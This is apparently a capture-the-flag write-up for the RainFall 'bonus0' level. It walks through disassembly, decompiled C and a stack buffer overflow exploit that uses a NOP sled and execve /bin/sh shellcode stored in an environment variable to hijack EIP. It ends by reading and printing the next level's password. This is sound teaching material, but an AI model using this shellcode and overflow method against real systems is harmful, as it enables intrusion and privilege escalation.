# Bonus0

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   ebp
   0x080485a5 <+1>:	mov    ebp,esp
   0x080485a7 <+3>:	and    esp,0xfffffff0
   0x080485aa <+6>:	sub    esp,0x40
   0x080485ad <+9>:	lea    eax,[esp+0x16]
   0x080485b1 <+13>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    eax,[esp+0x16]
   0x080485bd <+25>:	mov    DWORD PTR [esp],eax
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    eax,0x0
   0x080485ca <+38>:	leave  
   0x080485cb <+39>:	ret    
End of assembler dump.
```

```bash
(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   ebp
   0x080484b5 <+1>:	mov    ebp,esp
   0x080484b7 <+3>:	sub    esp,0x1018
   0x080484bd <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484c0 <+12>:	mov    DWORD PTR [esp],eax
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000
   0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
   0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:	mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa
   0x080484ee <+58>:	lea    eax,[ebp-0x1008]
   0x080484f4 <+64>:	mov    DWORD PTR [esp],eax
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	mov    BYTE PTR [eax],0x0
   0x080484ff <+75>:	lea    eax,[ebp-0x1008]
   0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14
   0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048514 <+96>:	mov    DWORD PTR [esp],eax
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave  
   0x0804851d <+105>:	ret    
End of assembler dump.
```

```bash
(gdb) disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:	push   ebp
   0x0804851f <+1>:	mov    ebp,esp
   0x08048521 <+3>:	push   edi
   0x08048522 <+4>:	push   ebx
   0x08048523 <+5>:	sub    esp,0x50
   0x08048526 <+8>:	mov    DWORD PTR [esp+0x4],0x80486a0
   0x0804852e <+16>:	lea    eax,[ebp-0x30]
   0x08048531 <+19>:	mov    DWORD PTR [esp],eax
   0x08048534 <+22>:	call   0x80484b4 <p>
   0x08048539 <+27>:	mov    DWORD PTR [esp+0x4],0x80486a0
   0x08048541 <+35>:	lea    eax,[ebp-0x1c]
   0x08048544 <+38>:	mov    DWORD PTR [esp],eax
   0x08048547 <+41>:	call   0x80484b4 <p>
   0x0804854c <+46>:	lea    eax,[ebp-0x30]
   0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
   0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048556 <+56>:	mov    DWORD PTR [esp],eax
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:	mov    ebx,0x80486a4
   0x08048563 <+69>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048566 <+72>:	mov    DWORD PTR [ebp-0x3c],0xffffffff
   0x0804856d <+79>:	mov    edx,eax
   0x0804856f <+81>:	mov    eax,0x0
   0x08048574 <+86>:	mov    ecx,DWORD PTR [ebp-0x3c]
   0x08048577 <+89>:	mov    edi,edx
   0x08048579 <+91>:	repnz scas al,BYTE PTR es:[edi]
   0x0804857b <+93>:	mov    eax,ecx
   0x0804857d <+95>:	not    eax
   0x0804857f <+97>:	sub    eax,0x1
   0x08048582 <+100>:	add    eax,DWORD PTR [ebp+0x8]
   0x08048585 <+103>:	movzx  edx,WORD PTR [ebx]
   0x08048588 <+106>:	mov    WORD PTR [eax],dx
   0x0804858b <+109>:	lea    eax,[ebp-0x1c]
   0x0804858e <+112>:	mov    DWORD PTR [esp+0x4],eax
   0x08048592 <+116>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048595 <+119>:	mov    DWORD PTR [esp],eax
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   0x0804859d <+127>:	add    esp,0x50
   0x080485a0 <+130>:	pop    ebx
   0x080485a1 <+131>:	pop    edi
   0x080485a2 <+132>:	pop    ebp
   0x080485a3 <+133>:	ret    
End of assembler dump.
```

Using https://dogbolt.org/?id=e155fda2-581f-4305-ad94-25b044fdefd5#Boomerang=1&Hex-Rays=159 to view a near source code :

```c
//----- (080484B4) --------------------------------------------------------
char *__cdecl p(char *dest, char *s)
{
  char buf[4104]; // [esp+10h] [ebp-1008h] BYREF

  puts(s);
  read(0, buf, 0x1000u);
  *strchr(buf, 10) = 0;
  return strncpy(dest, buf, 0x14u);
}

//----- (0804851E) --------------------------------------------------------
char *__cdecl pp(char *dest)
{
  char src[20]; // [esp+28h] [ebp-30h] BYREF
  char v3[28]; // [esp+3Ch] [ebp-1Ch] BYREF

  p(src, " - ");
  p(v3, " - ");
  strcpy(dest, src);
  dest[strlen(dest)] = ' ';
  dest[strlen(dest) + 1] = '\0';
  return strcat(dest, v3);
}

//----- (080485A4) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[42]; // [esp+16h] [ebp-2Ah] BYREF

  pp(s);
  puts(s);
  return 0;
}
```

First guess : Use `strcpy` to change the address it points to and set it to point to `puts` (GOT exploit) minus 4, then with `strcat` set the address of `system`.

It won’t work because we cannot inject the argument…

We probably should overflow `strcpy` and/or `strcat`. 

```bash
bonus0@RainFall:~$ (python -c 'print("A" * 20)'; python -c 'print("B" * 16)') | ./bonus0 
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBB
```
The first buffer should only contain the first user input, but if we write at least 20 chars, there is no space left for the null terminator, which means that the two local buffers that stores the first and the second input don't have any separation as they are adjacent.
In this situation : the first buffer contains a concatenation of the 2 user inputs and (only 20 chars of the first input are copied into it and 20 chars of the second input), the second buffer contains the second input, but segfaults with more than 16 chars if the first buffer is full because only 42 bytes are reserved for the `strcat`.

The `read` call reads 4096 bytes.

Syntax to fill stdin instead of inputing manually inside of gdb :

```bash
(gdb) r < <(python -c 'print("A" * 20)'; python -c 'print("B")')
```

After trying some combinations, it seems we cannot modify EIP with the first input buffer. We got the offset to override the EIP pointer with the second input buffer :

```bash
(gdb) r < <(python -c 'print("A" * 20)'; python -c 'print("A" * 9 + "B" * 4 + "C" * 7)')
Starting program: /home/user/bonus0/bonus0 < <(python -c 'print("A" * 4095 + "\n" + "A" * 9 + "B" * 4 + "C" * 7)')
 - 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCC��� AAAAAAAAABBBBCCCCCCC���

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Because we have a limited space, we will store our shellcode inside of an environment variable, which address will be called inside of the overwritten EIP.

Actually there is a char that will be helpfull for us :

> 💡 The NOP sled (`0x90`) ensures that even if the exact address of the shellcode is not known, the program's execution flow will "slide" through the NOP instructions until it reaches the actual shellcode. This increases the chances of successful exploitation.
>

We use the shellcode from https://shell-storm.org/shellcode/files/shellcode-827.html, with an offset of 100 NOP sled to be sure to reach our shellcode via our env viariable even with a calculation’s error.

Env variable :

```bash
export SHELLCODE=`python -c 'print("\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
```

Address of env variable with env.c script, **the address may change !**

```bash
bonus0@RainFall:/tmp$ ./a.out SHELLCODE
0xbffff827
```

```bash
bonus0@RainFall:~$ (python -c 'print("A" * 20)'; python -c 'print("A" * 9 + "\x27\xf8\xff\xbf" + "C" * 7)'; cat) | ./bonus0
 - 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA'���CCCCCCC��� AAAAAAAAA'���CCCCCCC���
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```